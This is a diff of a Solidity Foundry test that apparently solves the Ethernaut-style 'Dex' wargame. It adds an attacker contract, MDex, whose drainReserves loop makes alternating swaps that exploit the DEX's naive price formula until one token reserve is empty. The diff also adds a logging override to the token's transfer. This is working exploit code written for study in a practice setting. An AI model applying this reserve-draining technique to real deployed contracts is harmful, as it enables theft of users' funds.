@@ -11,7 +11,7 @@ contract DexTest is Test {
     SwappableToken token1;
     SwappableToken token2;
     Dex dex;
-    address anyone = address(256);
+    address anyone = address(100);
     function setUp() public {
         dex = new Dex();
         token1 = new SwappableToken(address(dex), "DAI", "DAI", 1e24);
@@ -31,86 +31,81 @@ contract DexTest is Test {
         console.log("Token2: ", anyoneToken1, anyoneToken2);
     }
 
-    function testInitalState() public {
+    function testDrainReserves() public {
+        MDex mDex = new MDex(address(dex));
+
         vm.startPrank(anyone);
-        uint256 i;
-        while (26 > i) {
-            uint256 anyoneToken1 = token1.balanceOf(anyone);
-            uint256 dexToken2Reserves = token2.balanceOf(address(dex));
-            uint256 swapAmount1 = dex.getSwapPrice(
-                address(token1),
-                address(token2),
-                anyoneToken1
-            );
-            console.log("SWAP 1 2", dexToken2Reserves, swapAmount1);
-            if (dexToken2Reserves >= swapAmount1) {
-                IERC20(address(token1)).approve(address(dex), anyoneToken1);
-                dex.swap(address(token1), address(token2), anyoneToken1);
-            } else {
-                uint256 amountIn = _getAmountIn(
-                    address(token1),
-                    address(token2),
-                    dexToken2Reserves
-                );
-                console.log("SWAP 1 2 << ", dexToken2Reserves, amountIn);
-                IERC20(address(token1)).approve(address(dex), amountIn);
-                dex.swap(address(token1), address(token2), amountIn);
-            }
-
-            uint256 anyoneToken2 = token2.balanceOf(anyone);
-
-            uint256 dexToken1Reserves = token1.balanceOf(address(dex));
-            dexToken2Reserves = token2.balanceOf(address(dex));
-
-            if (dexToken2Reserves == 0) {
-                i++;
-                continue;
-            }
-
-            uint256 swapAmount = dex.getSwapPrice(
-                address(token2),
-                address(token1),
-                anyoneToken2
-            );
-            console.log("SWAP 2 1", dexToken1Reserves, swapAmount);
-            if (dexToken1Reserves >= swapAmount) {
-                IERC20(address(token2)).approve(address(dex), anyoneToken2);
-                dex.swap(address(token2), address(token1), anyoneToken2);
-            } else {
-                uint256 amountIn = _getAmountIn(
-                    address(token1),
-                    address(token2),
-                    dexToken1Reserves
-                );
-                IERC20(address(token2)).approve(address(dex), amountIn);
-                dex.swap(address(token2), address(token1), amountIn);
-            }
-            i++;
-        }
+        token1.transfer(address(mDex), 10e18);
+        token2.transfer(address(mDex), 10e18);
+        mDex.drainReserves();
         vm.stopPrank();
-        uint256 dexToken1 = token1.balanceOf(address(dex));
-        uint256 dexToken2 = token2.balanceOf(address(dex));
-        uint256 anyoneToken1 = token1.balanceOf(anyone);
-        uint256 anyoneToken2 = token2.balanceOf(anyone);
+    }
+}
+contract MDex {
+    Dex dex;
 
-        console.log("Token1: ", dexToken1, dexToken2);
-        console.log("Token2: ", anyoneToken1, anyoneToken2);
+    constructor(address _dex) {
+        dex = Dex(_dex);
+    }
+
+    function drainReserves() external {
+        IERC20 token0 = IERC20(dex.token1());
+        IERC20 token1 = IERC20(dex.token2());
+        while (
+            token0.balanceOf(address(dex)) > 0 &&
+            token1.balanceOf(address(dex)) > 0
+        ) {
+            _swap(token0, token1);
+            _swap(token1, token0);
+        }
+    }
+
+    function _swap(IERC20 token0, IERC20 token1) internal {
+        uint256 anyone0 = token0.balanceOf(address(this));
+        uint256 reserves0 = token0.balanceOf(address(dex));
+        uint256 reserves1 = token1.balanceOf(address(dex));
+
+        if (reserves0 == 0 || reserves1 == 0) {
+            return;
+        }
+
+        uint256 swapAmount1 = dex.getSwapPrice(
+            address(token0),
+            address(token1),
+            anyone0
+        );
+
+        if (reserves1 > swapAmount1) {
+            token0.approve(address(dex), anyone0);
+            dex.swap(address(token0), address(token1), anyone0);
+        } else {
+            _swapAllReserves(token0, token1, reserves1);
+        }
+    }
+
+    function _swapAllReserves(
+        IERC20 token0,
+        IERC20 token1,
+        uint256 reserves1
+    ) internal {
+        uint256 amount0In = _getAmountIn(token0, token1, reserves1);
+        token0.approve(address(dex), amount0In);
+        dex.swap(address(token0), address(token1), amount0In);
     }
 
     function _getAmountIn(
-        address token0,
-        address token1,
+        IERC20 token0,
+        IERC20 token1,
         uint256 amountOut
     ) internal view returns (uint256) {
-        uint256 reserves0 = IERC20(token0).balanceOf(address(dex));
-        uint256 reserves1 = IERC20(token1).balanceOf(address(dex));
+        uint256 reserves0 = token0.balanceOf(address(dex));
+        uint256 reserves1 = token1.balanceOf(address(dex));
 
         uint256 numerator = reserves0 * amountOut;
         uint256 denominator = reserves1;
         return numerator / denominator;
     }
 }
-
 contract Dex is Ownable {
     address public token1;
     address public token2;
@@ -186,5 +181,13 @@ contract SwappableToken is ERC20 {
     function approve(address owner, address spender, uint256 amount) public {
         require(owner != _dex, "InvalidApprover");
         super._approve(owner, spender, amount);
+    }
+
+    function transfer(
+        address to,
+        uint256 amount
+    ) public override returns (bool) {
+        console.log("Transfer sender: ", msg.sender);
+        return super.transfer(to, amount);
     }
 }
